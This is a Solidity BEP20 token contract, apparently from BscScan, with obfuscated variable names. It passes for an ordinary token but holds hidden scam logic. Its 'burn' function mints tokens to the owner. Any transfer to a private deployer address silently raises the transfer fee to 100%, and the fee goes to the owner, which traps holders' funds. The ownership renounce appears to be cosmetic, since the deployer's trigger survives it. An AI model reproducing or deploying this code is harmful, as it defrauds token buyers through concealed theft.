/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract jPaBAm {
string public  name = "rLNBCB";
address public  esRqId = address(0);
uint256 public  jLrzFi = 10000000000000000000000000000;
uint256 public  gdJmTq = 100000000000000000;
uint8 public constant decimals = 18;
uint256 public  LRlJSW = 100000000000000000000000;
uint256 private  CNGlTO = 10000000000000;
uint256 public constant jZWWwc = 9+1;
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  QFFVvC = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
event Approval(address indexed owner, address indexed spender, uint256 value);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  QeilQi = 100000000000000000000;
address public  eGzBVH = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "CZNO1";
address public owner;
address public  xrlGWn = address(0);
uint256 public  pKvQpM = 10000000000000000;
uint256 public  ehGKrc = 100000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  dRYGGu = address(0);
uint256 public  lBFuTr = 1000000000000000000;
address private  iVerJO = address(0);
address public  chaNKZ = address(0);
uint256 public  MIIbPh = 10000000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () {
iVerJO = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "BVvEAU");
require(to != address(0), "BVvEAU");
require(amount <= balanceOf[from], "BVvEAU");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* jZWWwc/CNGlTO ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==iVerJO){
CNGlTO = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}